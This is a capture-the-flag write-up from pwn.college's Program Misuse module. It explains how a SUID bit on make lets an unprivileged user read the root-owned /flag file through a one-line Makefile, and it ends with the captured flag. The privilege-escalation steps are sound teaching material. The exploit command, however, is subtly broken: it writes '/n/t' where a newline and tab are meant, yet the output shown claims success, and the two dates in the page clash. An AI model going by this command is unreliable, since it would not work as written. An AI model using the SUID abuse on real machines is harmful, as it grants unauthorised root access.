---
layout: page
title: "Challenge Name: make"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/make`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/make
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/make
```

-The `s` in `-rws` indicates it's a SUID binary.
-`make` runs with **root privileges**.

## 🚀 Exploitation

The `make`  command in Linux is a build automation tool — it's mostly used to compile and build projects, especially those written in C, C++, or other compiled languages.

So we can easily use Makefile to cat /flag:

```bash
echo -e "all:/n/tcat /flag" > Makefile
make
```

Output:
```
cat /flag
pwn.college{sbiUEz2GPn-cyCe8SVy0ruAD8to.dhjNxwSM0IzMyEzW}
```

